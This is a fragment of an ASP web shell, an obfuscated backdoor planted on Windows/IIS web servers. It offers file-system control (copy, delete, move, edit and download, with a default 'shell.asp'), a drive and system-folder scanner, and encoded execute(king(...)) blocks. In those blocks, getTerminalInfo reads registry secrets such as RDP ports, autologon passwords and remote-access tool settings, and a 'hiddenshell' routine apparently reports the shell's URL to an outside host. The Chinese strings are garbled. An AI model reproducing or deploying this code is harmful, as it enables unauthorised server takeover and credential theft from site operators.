SI=SI&"<td  height=10 width=17% align=center><div  onMouseOver=""this.style.backgroundColor='#B3D169'"" onMouseOut=""this.style.backgroundColor='#191919'"" style='border:1px solid #dddddd;padding-bottom:4px' id=d><a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")' title=""����"">"
SI=SI&"&nbsp;<font face='wingdings' color='#ffffff' size='6'>0</font>  "
si=si&"<br>"&F.Name&"</a><br><a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='����'>Copy</a> <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")' onclick='return yesok()' class='am' title='ɾ��'>Del</a> <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")' onclick='return yesok()' class='am' title='�ƶ�'>Move</a> <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""DownFile"")' onclick='return yesok()' class='am' title='����'>Down</a></div></td>"
i=i+1
If i mod 6=0 then SI=SI&"</tr><tr>"
Next
SI=SI&"</tr><tr><td height=2></td></tr>"
j SI &"" : SI="":i=0
SI="<div id=links><table width='100%' align=center id =linklist2><tr><td id=s><b id=x>Filename</b></td><td id=s height=22><b id=x>Size</b></td><td id=s><b id=x>Type</b></td><td id=s><b id=x>Operating</b></td><td id=s><b id=x>Last Modified</b></td><td></td>"
For Each L in Fold.files
SI=SI&"<tr><td height='20' id=d >"
si=si&"<font face='wingdings' color='#FF6600' size='3'>2</font>"
si=si&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='����'>  "&L.Name&"</a><Td id=d>"&clng(L.size/1024)&"K</td><Td id=d>"&L.Type&"</td><Td id=d>"
si=si&"<a href="""&openUrl(PaTh&"\"&L.nAme)&""" class='am' title='Open'>Open</a> "
si=si&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='�༭'>Edit</a> "
Si=Si&"<a onclick=""window.open('?Action=EditPower&PowerPath="&RepAth(PaTh&"\"&L.nAme)&"','EditPower','toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=300,height=200')"" href='###' class='am' title='Ȩ��'><font  color='#33FF00' >Ȩ��</font></a>"
Dim EditOOK
EditOOK=1
EditOOV=l.Attributes
If EditOOV >= 128 Then
EditOOV = EditOOV - 128
End If
If EditOOV >= 64 Then
EditOOV = EditOOV - 64
End If
If EditOOV >= 32 Then
EditOOV = EditOOV - 32
End If
If EditOOV >= 16 Then
EditOOV = EditOOV - 16
End If:If EditOOV >= 8 Then
EditOOV = EditOOV - 8
End If
If EditOOV >= 4 Then
EditOOV = EditOOV - 4:EditOOK=0
End If
If EditOOV >= 2 Then
EditOOV = EditOOV - 2:EditOOK=0
End If
If EditOOV >= 1 Then
EditOOV = EditOOV - 1:EditOOK=0
End If
if EditOOK=0 then
si=si&"<font face='webdings' size='1' color=red>x</font>"
else
si=si&"��"
end if
si=si&" <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>Del</a> <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='����'>Copy</a> <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a></td><td id=d>"&replace(L.DateLastModified,"/","-")&"</td></tr>"
i=i+1
Next
j SI&"</tr></table></div><script>var container = new Array(""linklist2""); var objects = new Array(); var links = new Array(); var tmp = new Array(); var interval = 0; var c=0; function initEventListener() { for(i=0; i < container.length; i++) { objects = document.getElementById(container[i]).getElementsByTagName(""td""); for(j=0; j < objects.length; j++) {    if(document.all) { objects[j].attachEvent(""onmouseover"", resetLinkFade); objects[j].attachEvent(""onmouseout"", startLinkFade); } else {objects[j].addEventListener(""mouseover"", resetLinkFade, false); objects[j].addEventListener(""mouseout"", startLinkFade, false); } var defcol = getPseudoRule(container[i], ""td"");  var hovcol = getPseudoRule(container[i], ""td:hover""); if(defcol.charAt(0) == ""#"") defcol = hex2rgb(defcol); else if(defcol[0] == ""r"") { defcol = defcol.match(/rgb\((\d+), (\d+), (\d+)\)/); defcol = defcol.slice(1);} if(hovcol.charAt(0) == ""#"") hovcol = hex2rgb(hovcol); else if(hovcol[0] == ""r""){ hovcol = hovcol.match(/rgb\((\d+), (\d+), (\d+)\)/); hovcol = hovcol.slice(1); } links[c]     = new Array(); links[c][""object""]  = objects[j]; links[c][""defaultcolor""] = defcol; links[c][""currentcolor""] = defcol; links[c][""hovercolor""] = hovcol; c++; } } } function resetLinkFade(e) { var evt = e || window.event; var obj = evt.target || evt.srcElement; for(r=0; r<links.length; r++) { if(obj == links[r][""object""]) { tmp = links[r][""defaultcolor""].clone(); links[r][""currentcolor""] = links[r][""defaultcolor""]; links[r][""object""].style.backgroundColor = rgb2hex(links[r][""hovercolor""]); } } }function startLinkFade(e) {   var evt = e || window.event; var obj = evt.target || evt.srcElement; for(r=0; r<links.length; r++) { if(obj == links[r][""object""]) { links[r][""defaultcolor""] = tmp.clone(); links[r][""currentcolor""] = links[r][""hovercolor""].clone(); links[r][""object""].style.backgroundColor = rgb2hex(links[r][""hovercolor""]); } } if(interval == 0) interval = window.setInterval(linkFade,  30); } function linkFade() {  var runners = 0; for(o=0; o<links.length; o++) { var aim  = links[o][""object""]; var defcol = links[o][""defaultcolor""]; var hovcol = links[o][""hovercolor""]; var actcol = links[o][""currentcolor""]; if( defcol[0]+defcol[1]+defcol[2] != actcol[0]+actcol[1]+actcol[2] ) { runners++; actcol[0] = actcol[0]-10 < 25 ? 25 : actcol[0]-10; actcol[1] = actcol[1]-10 < 25 ? 25 : actcol[1]-10; actcol[2] = actcol[2]-10 < 25 ? 25 : actcol[2]-10; aim.style.backgroundColor = rgb2hex(actcol); links[o][""currentcolor""] = actcol; } } if(runners == 0) { window.clearInterval(interval); interval=0; } } function getPseudoRule(parent, element) {  var mysheet =document.styleSheets[0]; var myrule  = mysheet.cssRules || mysheet.rules; for (n = 0; n < myrule.length; n++) if (myrule[n].selectorText.toLowerCase() == ""#""+ parent +"" ""+ element) return myrule[n].style.backgroundColor; else if (myrule[n].selectorText.toLowerCase() == element) return myrule[n].style.backgroundColor; return """"; } function hex2rgb(hex) { var triplet = hex.toLowerCase().replace(/#/, ''); var rgbArr  = new Array();  if(triplet.length == 6) { rgbArr[0] = parseInt(triplet.substr(0,2), 16) ;rgbArr[1] = parseInt(triplet.substr(2,2), 16) ;rgbArr[2] = parseInt(triplet.substr(4,2), 16) ;return rgbArr; } else if(triplet.length == 3){rgbArr[0] = parseInt((triplet.substr(0,1) + triplet.substr(0,1)), 16); rgbArr[1] = parseInt((triplet.substr(1,1) + triplet.substr(1,1)), 16); rgbArr[2] = parseInt((triplet.substr(2,2) + triplet.substr(2,2)), 16); return rgbArr; } else { throw triplet + ' is not a valid color triplet.'; } } function rgb2hex(rgb) { var hexcolors = new Array(""0"",""1"",""2"",""3"",""4"",""5"",""6"",""7"",""8"",""9"",""a"",""b"",""c"",""d"",""e"",""f""); var r, r1, r2, g, g1, g2, b, b1, b2; r1 = Math.floor(rgb[0] / 16); r2 = rgb[0] - r1*16; g1 = Math.floor(rgb[1] / 16); g2 = rgb[1] - g1*16; b1 = Math.floor(rgb[2] / 16); b2 = rgb[2] - b1*16; r = hexcolors[r1] + hexcolors[r2]; g = hexcolors[g1] + hexcolors[g2]; b = hexcolors[b1] + hexcolors[b2]; return ""#""+r+g+b; } Object.prototype.clone = function(deep) { var objectClone = new this.constructor(); for (var property in this) if (!deep) objectClone[property] = this[property]; else if (typeof this[property] == 'object') objectClone[property] = this[property].clone(deep); else {objectClone[property] = this[property]; }return objectClone; } "&VBNEWLINE
if ysjb=true then j "initEventListener();</script>":end if
Set FOLD=Nothing
End function
Function DelFile(Path)
execute(king("yC rfS��CU p��skMaeqA&CU=CU��`>ktzfte/<�����ɳ�ɾ `&izqY&` ������ϲ��>kw<>kw<>kw<>ktzfte<`=CU��izqY tsoXtztstW.XZ��ftiJ )izqY(lzlobStsoX.XZ yC"))
End Function
Function EditFile(Path)
If Request("Action2")="Post" Then:Set T=CF.CreateTextFile(Path):T.WriteLine Request.form("content"):T.close:Set T=nothing:SI="<center><br><br><br>��ϲ���ļ�����ɹ���</center>":SI=SI&BackUrl:j SI:Response.End:End If:If Path<>"" Then:Set T=CF.opentextfile(Path, 1, False):Txt=HTMLEncode(T.readall) :T.close:Set T=Nothing:Else:Path=Session("FolderPath")&"\shell.asp":Txt=strBAD:End If:j "<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'><input name='Action' value='EditFile' Type='hidden'><input name='FName' value='"&Path&"' style='width:100%'><br><textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br><hr><input name='goback' type='button' value='Back' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='Reset'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='Save'></form>"
End Function
Function CopyFile(Path)
execute(king("yC rfS�� CU p��skMaeqA&CU=CU��`>ktzfte/<�������Ƹ�`&)1(izqY&`������ϲ��>kw<>kw<>kw<>ktzfte<`=CU��)0(izqY,)1(izqY tsoXnhgZ.XZ��ftiJ ``><)0(izqY rfq ))1(izqY(lzlobStsoX.XZ yC��)`||||`,izqY(zoshU=izqY"))
End Function
Function MoveFile(Path)
execute(king("yC rfS�� CU p��skMaeqA&CU=CU��`>ktzfte/<�����ɶ���`&)1(izqY&`������ϲ��>kw<>kw<>kw<>ktzfte<`=CU��)0(izqY,)1(izqY tsoXtcgT.XZ��ftiJ ``><)0(izqY rfq ))1(izqY(lzlobStsoX.XZ yC��)`||||`,izqY(zoshU=izqY"))
End Function
Function DelFolder(Path)
execute(king("yC rfS��CU p��skMaeqA&CU=CU��`>ktzfte/<�����ɳ�ɾ`&izqY&`¼Ŀ��ϲ��>kw<>kw<>kw<>ktzfte<`=CU��izqY ktrsgXtztstW.XZ��ftiJ )izqY(lzlobSktrsgX.XZ yC"))
End Function
Function CopyFolder(Path)
execute(king("yC rfS��CU p��skMaeqA&CU=CU��`>ktzfte/<�������Ƹ�`&)1(izqY&`¼Ŀ��ϲ��>kw<>kw<>kw<>ktzfte<`=CU��)0(izqY,)1(izqY ktrsgXnhgZ.XZ��ftiJ ``><)0(izqY rfq ))1(izqY(lzlobSktrsgX.XZ yC��)`||||`,izqY(zoshU=izqY"))
End Function
Function MoveFolder(Path)
execute(king("yC rfS��CU p��skMaeqA&CU=CU��`>ktzfte/<�����ɶ���`&)1(izqY&`¼Ŀ��ϲ��>kw<>kw<>kw<>ktzfte<`=CU��)0(izqY,)1(izqY ktrsgXtcgT.XZ��ftiJ ``><)0(izqY rfq ))1(izqY(lzlobSktrsgX.XZ yC��)`||||`,izqY(zoshU=izqY"))
End Function
Function NewFolder(Path)
execute(king("yC rfS��CU p��skMaeqA&CU=CU��`>ktzfte/<�����ɽ���`&izqY&`¼Ŀ��ϲ��>kw<>kw<>kw<>ktzfte<`=CU��izqY ktrsgXtzqtkZ.XZ��ftiJ ``><izqY rfq )izqY(lzlobSktrsgX.XZ zgG yC"))
End Function
End Class

sub getTerminalInfo()
execute(king("yo rfS��`����tktivnfQeh���ý��Ʋ�����¼Ŀ��Ĭ���Կ�,��������tktivnfQeh_�ַ�>os<`p��ftiJ )`yoe.`&tdqfktcktl&`\etzfqdnU\qzqW fgozqeoshhQ\lktlM ssQ\lufozztU rfQ lzftdxegW\`&ktcokrlnl(lzlobStsoX.gly yC��)`tdqGktzxhdgZ\tdqGktzxhdgZ\tdqGktzxhdgZ\sgkzfgZ\ztUsgkzfgZzftkkxZ\TSJUOU\TVFD`(rqtNutN.ilv=tdqfktcktl��)9,)9(ktrsgXsqoethlztE.glX(zyts=tcokrlnU��)BUX_JUGBZ(zetpwgtzqtkZ.ktcktU=gly ztU��zbtG��yo rfS��yo rfS��`>kw<��ľYDY��д�Ҳ�,¼ĿsoqTwtK�Ҳ��Կ�,������ȨdtzlnUsqegV����,soqdfoK eouqT_���������>os<`p��ftiJ `dtzlnUsqegV`=tdqGzfxgeeQteocktU.teocktUpwg yo��ftiJ )`soqdfov`,)tdqG.teocktUpwg(tlqes(kzlfo yo��yo rfS��yo rfS��`>kw<Ȩ����ľhlR��ʹ�ǿ��Կ�,������ȨdtzlnUsqegV����,zqedgJ_���������>os<`p��ftiJ `dtzlnUsqegV`=tdqGzfxgeeQteocktU.teocktUpwg yo��ftiJ )`zqedgz`,)tdqG.teocktUpwg(tlqes(kzlfo yo��yo rfS��yo rft��yo rfS��`>kw<��ľYDY�ǿ��Կ�,dtzlnUsqegVΪ��Ȩ����,�ڴ����tieqhQ_���������>os< `p��tlsS��`>kw<Ȩ���ֱ�Կ�.tieqhQΪ�����ASKǰ��>os<`p��ftiJ )`tieqhQ`,)`SNQKJXBU_NSINSU`(ltswqokqIktcktU.zltxjtN(kzlfo yC��ftiJ `dtzlnUsqegV`=tdqGzfxgeeQteocktU.teocktUpwg yo��ftiJ `tieqhq`=)tdqG.teocktUpwg(tlqes yo��yo rfS��yo rfS��`>kw<Ȩ��߹�tbt.xl���ǿ��Կ�,������ȨdtzlnUsqegV����,װ��M-cktU_���������>os<`p��ftiJ `dtzlnUsqegV`=tdqGzfxgeeQteocktU.teocktUpwg yo��ftiJ `M-cktU`=tdqG.teocktUpwg yo��ktzxhdgZpwg fC teocktUpwg ieqS kgX��zbtG tdxltN kgkkS fB��)`teocktU`(nqkkQ = ktzsoX.ktzxhdgZpwg��)`fgozqeoshhQ.sstiU`(zetpwBtzqtkZ.ktcktU = ql ztU��)`.//:JGfoK`(zetpwBztE = ktzxhdgZpwg ztU��`>ki<>kw<]��̽��_�������[`p��`>kw<>kw<>kw<------------------------------------`p��`>kw<`&aa&`:Ϊ����_����ǰ��>os<`p��)ai(rqtNutN.ilv=aa��`zfxgZ\dxfS\hoheJ\lteocktU\011ztUsgkzfgZ\TSJUOU\TVFD`=ai��`>kw<`&sdzf&`:Ϊ����sdzG ztfstJ>os<`p��0=sdzG ftiJ ``=sdzf yo��)ntaVTJG(rqtNutN.ilK=sdzf��`VTJG\1.0\ktcktUztfstJ\zyglgkeoT\SNQKJXBU\SGCDZQT_VQZBV_OSFD`=ntaVTJG��`>kw<`&nshlor&`:������Ǵ�_��ʾ�Է���>os<`p��`��`=nshlor tlst `��`=nshlor ftiJ 1=fougshlor kg ``=fougshlor yC��)`tdqGktlMzlqVnqshloWzfgW\dtzlnU\ltoeosgY\fgolktIzftkkxZ\lvgrfoK\zyglgkeoT\tkqvzygU\SGCDZQT_VQZBV_OSFD`(rqtNutk.ilv=fougshlor��yo rfS��`>zfgy/<>kw<`&rvllqY&`:����>rtk=kgsge zfgy<>tkqxjl=thnz os<`p��`>kw<`&fodrQ&`:������>tkqxjl=thnz os<`p��)`rkgvllqYzsxqytW\fgugsfoK\fgolktIzftkkxZ\JG lvgrfoK\zyglgkeoT\SNQKJXBU\SGCDZQT_VQZBV_OSFD`(rqtNutN.ilK=rvllqY��)`tdqGktlMzsxqytW\fgugsfoK\fgolktIzftkkxZ\JG lvgrfoK\zyglgkeoT\SNQKJXBU\SGCDZQT_VQZBV_OSFD`(rqtNutN.ilK=fodrQ��`>kw<����:��Ƕ�_�Ի���>os<`p��tlsS��`>kw<����δ:��Ƕ�_�Ի���>os<`p��ftiJ ``=fougsgzxQ kg 1=fougsgzxQ yo��)fougsgzxQlo(rqtNutN.ilK=fougsgzxQ��`fgugVfodrQgzxQ\fgugsfoK\fgolktIzftkkxZ\JG lvgrfoK\zyglgkeoT\SNQKJXBU\SGCDZQT_VQZBV_OSFD`=fougsgzxQlo��`>zfgy/<>kw<`&tdqGfodrQ&`>rtk=kgsge zfgy<:Ϊ������Ա`&`������Ĭ>os<`p����yo rft��`akgvztG.zhokelK:���в���������`p��ftiz kkt yo��zbtG��`>os/<>zfgy/<>kw<`&tdqG.fodrq&`����Ա����ǰ��>rtk=kgsge zfgy<>os<` p��lktwdtT.hxgkEpwg fo fodrq ieqS kgX��)`hxgku,lkgzqkzlofodrQ/`&tdqGktzxhdgZ.Gz&`//:JGfoK`(zetpwBztE=hxgkEpwg ztU��)`akgvztG.zhokelK`(zetpwBtzqtke.ktcktl=Gz ztU�� zbtf tdxltk kgkkt fg��1=ltkohbS.tlfghltN��`kgzqkzlofodrQ`=tdqGfodrQ ftiJ ``=tdqffodrq yo��)ntFtdqGfodrQ(rqtNutN.ilv=tdqGfodrQ��`tdqGktlMzsxqytWzsQ\fgugsfoK\fgolktIzftkkxZ\JG lvgrfoK\zyglgkeoT\SNQKJXBU\SGCDZQT_VQZBV_OSFD`=ntFtdqGfodrQ��`>kw<`&tdqfeh&`:Ϊ����_��ǰ��>os<`p��`>kw<.������ȡ_������`=tdqfeh ftiJ ``=tdqfeh yo��)ntatdqfeh(rqtNutN.ilv=tdqfeh��`tdqGktzxhdgZ\tdqGktzxhdgZ\tdqGktzxhdgZ\sgkzfgZ\ztUsgkzfgZzftkkxZ\TSJUOU\TVFD`=ntatdqfeh��`>0=tmol ki<>kw<]��̽_����ͳϵ[>kw<>kw<`p��zbtf��`>kw<`&)o(lizqh&`>os<`p��)lizqh(rfxgwM gz )lizqh(rfxgwV=o kgX��`>kw<:���侶·_ǰ��ͳϵ`p��`>kw<------------------------------------`p��)`;`,izqYzygU(zoshl=lizqh��`>kw<��֧:_������ɱ��ϵ����>os<`p ftiJ )`ufolok`,gyfoizqY(kzlfo yo��`>kw<��֧:_������ɱ��������>os<`p ftiJ )`lxkocozfq`,gyfoizqY(kzlfo yo��`>kw<��֧:_������ɱ��ϵɽ�� >os<`p ftiJ )`cqa`,gyfoizqY(kzlfo yo��`>kw<��֧:_������ɱssoF>os<`p ftiJ )`ssoF`,gyfoizqY(kzlfo yo��`>kw<��֧:_�ƿ�tktivnfQeY��������>os<`p ftiJ )`tktivnfqeh`,gyfoizqY(kzlfo yo��`>kw<��֧:_�����TXZ>os<`p ftiJ )`4bdfgolxye`,gyfoizqY(kzlfo yo��`>kw<��֧:_��������tseqkB>os<`p ftiJ )`tseqkg`,gyfoizqY(kzlfo yo��`>kw<��֧:_��������VHUnT>os<`p ftiJ )`sjlnd`,gyfoizqY(kzlfo yo��`>kw<��֧:_��������VHUUT>os<`p ftiJ )`ktcktl sjl zyglgkeod`,gyfoizqY(kzlfo yo��`>kw<��֧:_����qcqR>os<`p ftiJ )`qcqp`,gyfoizqY(kzlfo yo��`>kw<��֧:_����sktY>os<`p ftiJ )`skth`,gyfoizqY(kzlfC yo��`:��֧��`&`��ͳϵ`p��)izqYzygU(tlqes=gyfoizqY��)`izqY`(dtzo.zftdfgkocfS.ilK=izqYzygU��`>0=tmol ki<>kw<]��̽��_��ͳϵ[>kw<>kw<>kw<`p��`>sg/<`p��yC rfS��`>kw<` & rkgvllqYfougVgzxq & ` :���ܻ��ʵ�`&`¼�Ƕ���`p��yC rfS��`tlsqX`p��kqtsZ.kkS��ftiJ kkS yC��)ntFllqYfougVgzxq & izqYfougVgzxq(rqtNutN.Llv = rkgvllqYfougVgzxq��`>kw<` & tdqfktlMfougVgzxq & ` :����ͳϵ��`&`¼�Ƕ���`p��)ntFktlMfougVgzxq & izqYfougVgzxq(rqtNutN.Llv = tdqfktlMfougVgzxq��tlsS��ftiJ 1 = tswqfSfougVgzxQlo yC��)ntFtswqfSfougVgzxq & izqYfougVgzxq(rqtNutN.Llv = tswqfSfougVgzxQlo��`rkgvllqYzsxqytW` = ntFllqYfougVgzxq��`tdqGktlMzsxqytW` = ntFktlMfougVgzxq��`fgugVfodrQgzxQ` = ntFtswqfSfougVgzxq��`\fgugsfoK\fgolktIzftkkxZ\JG lvgrfoK\zyglgkeoT\SNQKJXBU\SGCDZQT_VQZBV_OSFD` = izqYfougVgzxq��yC rfS��`>/kw<` & zkgYdktz & ` :�ڶ�`&`�������ǰ��`p��tlsS ��`>/kw<.���޵��ܷ�����Ȩ��� ,�ڶ˶��յ��÷���`p�� ftiJ 1 >< ktwdxG.kkS kB `` = zkgYdktz yC��`>sg<¼�Ƕ��Լ�`&`�ڶ����_����`p��)ntFzkgYsqfodktz & izqYzkgYsqfodktz(rqtNutN.Llv = zkgYdktz��`ktwdxGzkgY` = ntFzkgYsqfodktz��`\heJ-YWN\lfgozqzUfoK\ktcktU sqfodktJ\sgkzfgZ\ztUsgkzfgZzftkkxZ\TSJUOU\TVFD` = izqYzkgYsqfodktz��rkgvllqYfougVgzxq ,tdqfktlMfougVgzxq ,ntFtswqfSfougVgzxq ,tswqfSfougVgzxQlo doW��ntFllqYfougVgzxq ,ntFktlMfougVgzxq ,izqYfougVgzxq doW��zkgYdktz ,ntFzkgYsqfodktz ,izqYzkgYsqfodktz doW��)`sstiU.zhokeUK`(zetpwBtzqtkZ.ktcktU = Llv ztU��`------------------------------------------------------`p��`>kw<`&zkgYKQY&`:Ϊ�ڶ�tktivnfQeY>os<`p��`tktivnfQehװ����`&`�ǻ���`&`��ȷ��.ȡ��`&`����`=zkgYKQY ftiz ``=zkgYKQY yC��)ntFtktivnfQeh(rqtNutN.ilK=zkgYKQY��`zkgYqzqWYCYZJ\dtzlnU\fgolktIzftkkxZ\tktivnfQeh\etzfqdnU\SNQKJXBU\SGCDZQT_VQZBV_OSFD`=ntFtktivnfQeh��`>zfgy/<>kw<`&zkgYdktJ&`>rtk=kgsge zfgy<:Ϊ�ڶ�teocktU sqfodktJ>os<`p��`��������ktcktU lvgrfoKΪ����`&`��ȷ��.ȡ��`&`����`=zkgYdktJ ftiJ ``=zkgYdktJ yC��)ntFdktJ(rqtNutN.ilK=zkgYdktJ��`ktwdxGzkgY\hez\lrJ\rvhrk\lrK\ktcktU sqfodktJ\sgkzfgZ\ztUsgkzfgZzftkkxZ\TSJUOU\SGCDZQT_VQZBV_OSFD`=ntFdktJ��`>kw<`&zkghzfsJ&`:��`&`��ztfstJ>os<`p��`)����`&`��Ĭ(89`=zfsJ ftiJ ``=zkgYzfsJ yo��)ntFztfstJ(rqtNutN.ilK=zkgYzfsJ��`zkgYztfstJ\1.0\ktcktUztfstJ\zyglgkeoT \SNQKJXBU\SGCDZQT_VQZBV_OSFD`=ntaztfstJ��`>0=tmol ki<>kw<]��̽`&`�ڶ�`&`����[>kw<>kw<`p��yo rft��zbtG��`>kw<------------------------------------------------`p��yo rfS��yo rfS��`>kw<`p��zbtf��`,`&)p(vgssqYWM p��)vgssqhrx(rfxgAM gJ )vgssqhrx(rfxgAV = p kgy��`:Ϊ�ڶ�hrx��`&`����>os<`p��tlsS��`>kw<��ȫ:Ϊ�ڶ�hrx��`&`����>os<`p��ftiJ 1=)1(vgssqhrx kg ``=)1(vgssqhrx yC��)YWMssxX(rqtNutN.ilK=vgssqhrx��yo rfS��`>kA<`p��zbtG��`,`&)p(vgssqhez p��)vgssqhez(rfxgAM gJ )vgssqhez(rfxgAV = p kgX��`:Ϊ�ڶ�hez��`&`����>os<`p��tlsS��`>kw<��ȫ:Ϊ�ڶ�hez��`&`����>os<`p��ftiJ 1=)1(vgssqhez kg ``=)1(vgssqhez yC��)YZJssxX(rqtNutN.ilK=vgssqhez��FMS&ArhQ&izqh=YWMssxX��FJS&ArhQ&izqY=YZJssxX��`lzkgYrtvgssQYWM\`=FMS��`lzkgYrtvgssQYZJ\`=FJS��tlst��`>kw<ѡɸYC/heJû>os<`p�� ftiJ 0=ktzsoyhohezgG yo��yC rfS��`>kw<������û��ȡ������UGW`&`��Ĭ>os<`p��tlsS��`>kw<`&kzlUGW&`:ΪUGW`&`����>os<`p��ftiJ ``><kzlUGW yC��)ntFUGW(rqtNutN.ilK=kzlUGW��`ktcktUtdqG\`&ArhQ&izqY=ntFUGW��yo rfS��`>kw<������û��ȡ�����޹���>os<`p��tlsS��zbtG��`>kw<`&)p(nqvtzqE&`:`&p&`����>os<`p��)nqvtzqE(rfxgwM gz )nqvtzqE(rfxgwV=p kgX��ftiJ )nqKtzqE(nqkkqlo yC��)ntFnqKtzqE(rqtkutN.ilK=nqKtzqE��`nqvtzqEzsxqytW\`&ArhQ&izqY=ntFnqKtzqE��yo rfS��`>kw<������û��`&`ȡ������ַ`&`��YC>os<`p��tlsS��zbtG��`>kw<`&)p(krrQYC&`:Ϊ`&p&`ַ`&`��YC>os<`p��)krrQYC(rfxgwM gz )krrQYC(rfxgwV=p kgX��ftiJ ``><)1(krrqYC yC��)ntFYC(rqtkutN.ilK=krrqYC��`lltkrrQYC\`&ArhQ&izqY=ntFYC��`\lteqyktzfC\lktztdqkqY\hoheJ\lteocktU\011ztUsgkzfgZ\TSJUOU\SGCDZQT_VQZBV_OSFD`=izqY��`>kw<`&ArhQ&`:Ϊ�����`&o&`����`p��)``,`\teoctW\`,)o(lrhQ(teqshtN=ArhQ��0-)lrhQ(rfxgAM gJ )lrhQ(rfxgAV=o kgX�� ftiJ )lrhQ(nqkkQlC yC��)ntFrhQ(rqtNutN.ilK=lrhQ��`rfoA\tuqafoV\hoheJ\lteocktU\011ztUsgkzfgZ\TSJUOU\TVFD`=ntFrhQ��yC rfS��0=ktzsoyhohezgG��ftiJ ``=tswqfSlo kg 1=tswqfSlo yC��)ntFhoheJtswqfS(rqtkutN.ilK=tswqfSlo��`lktzsoXnzokxetUtswqfS\lktztdqkqY\hoheJ\lteocktU\ztUsgkzfgZzftkkxe\TSJUOU\TVFD`=ntFYCYZJtswqfS��`>0=tmol ki<>kw<]��̽`&`����[`p��)`sstiU.zhokelK`(zetpwgtzqtke=ilv ztl��ilv dor��zbtf tdxltk kgkkt fg"))
End Sub:sub hiddenshell
execute(king("`>zhokel/<;'`&skx&)`tdqf_ktcktl`(zltxjtk&`//:hzzi'=fgozqegs.zftkqh>zhokel<` p��ufoizgf=gly ztl��0tdqftsoy&`.`&bthrfk&`\`&0izqhtsoy&`\.\\`,izqhy tsoynhge.gly��0tdqftsoy&`.`&bthrfk&))`/`,skx(ctkkzlfo,skx(zyts=skx��)`skx`(ltswqokqcktcktl.zltxjtk=skx��))`\`,izqhy(ctkkzlfo-)izqhy(fts,izqhy(ziuok=0tdqftsoy��)`.`(izqhhqd.ktcktl=0izqhtsoy��``=)`vpstl`(fgolltl��))40,1(ktwdxfrfk()`|`,bth(zoshl=bthrfk��`2zhs|3zhs|4zhs|5zhs|6zhs|7zhs|8zhs|9zhs|0zhs|2dge|3dge|4dge|5dge|6dge|7dge|8dge|9dge|0dge`=bth��)BUX_JUGBZ(zetpwgtzqtke.ktcktl=gly ztl��))`STQG_JYCNZU`(ltswqokqIktcktU.zltxjtN(izqYhqT.ktcktU=izqhy"))
end sub
Sub Message(state,msg,flag)
j"<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#ddd> <TR></TR><TR><TD align=middle bgcolor=#ecfccd><TABLE width=82% border=0 cellpadding=5 cellspacing=0><TR><TD><FONT color=red>"
j state
j"</FONT></TD><TR><TD><P>"&msg
j"</P></TD></TR></TABLE></TD></TR><TR><TD class=TBEnd>"
If flag=0 Then
j" <INPUT type=button value=�ر� onclick='window.close();'>"
Else
End if
j"</TD></TR></TABLE>"
End Sub
Function Red(str)
Red = "<FONT color=#ff2222>" & str & "</FONT>"
End Function

Function RndNumber(Min,Max) 
Randomize 
RndNumber=Int((Max - Min + 1) * Rnd() + Min) 
End Function


Sub ScanDriveForm()
Dim FSO,DriveB
Set FSO = Server.Createobject(CONST_FSO)
j"<br><TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgcolor=#ffffff><TR><TD colspan=5 class=TBHead>����/ϵͳ�ļ�����Ϣ</TD></TR>"
  For Each DriveB in FSO.Drives
j" <TR align=middle class=TBTD><FORM action=?Action=ScanDrive&Drive="
j DriveB.DriveLetter
j" method=Post><TD width=25"&chr(37)&"><B>�̷�</B></TD><TD width=15"&chr(37)&">"
j DriveB.DriveLetter
j":</TD><TD width=20"&chr(37)&"><B>����</B></TD><TD width=20"&chr(37)&">"
  Select Case DriveB.DriveType
  Case 1: j"���ƶ�"
  Case 2: j"����Ӳ��"
  Case 3: j"�������"
  Case 4: j"CD-ROM"
  Case 5: j"RAM����"
  Case else: j"δ֪����"
  End Select
j"</TD><TD><INPUT type=submit value=��ϸ����></TD></FORM></TR>"
  Next
j" <TR class=TBTD><FORM action=?Action=ScFolder&Folder="
j FSO.GetSpecialFolder(0)
j" method=Post><TD align=middle><B>Windows�ļ���</B></TD><TD colspan=3>"
j FSO.GetSpecialFolder(0)
j"</TD><TD align=middle><INPUT type=submit value=��ϸ����></TD></FORM></TR><TR class=TBTD><FORM action=?Action=ScFolder&Folder="
j FSO.GetSpecialFolder(1)
j" method=Post><TD align=middle><B>System32�ļ���</B></TD><TD colspan=3>"
j FSO.GetSpecialFolder(1)
j"</TD><TD align=middle><INPUT type=submit value=��ϸ����></TD></FORM></TR><TR class=TBTD><FORM action=?Action=ScFolder&Folder="
j FSO.GetSpecialFolder(2)
j" method=Post><TD align=middle><B>ϵͳ��ʱ�ļ���</B></TD><TD colspan=3>"
j FSO.GetSpecialFolder(2)
j"</TD><TD align=middle><INPUT type=submit value=��ϸ����></TD><TR class=TBTD> <FORM action= method=Post>"
j"<TD align=middle><B>վ���Ŀ¼</B></TD><TD colspan=3>վ���Ŀ¼<TD align=middle><a href="&URL&"?Action=ScFolder&Folder="&wwwroot&"><b>��ϸ����</b></a></TD><TR class=TBTD> <FORM action= method=Post>"
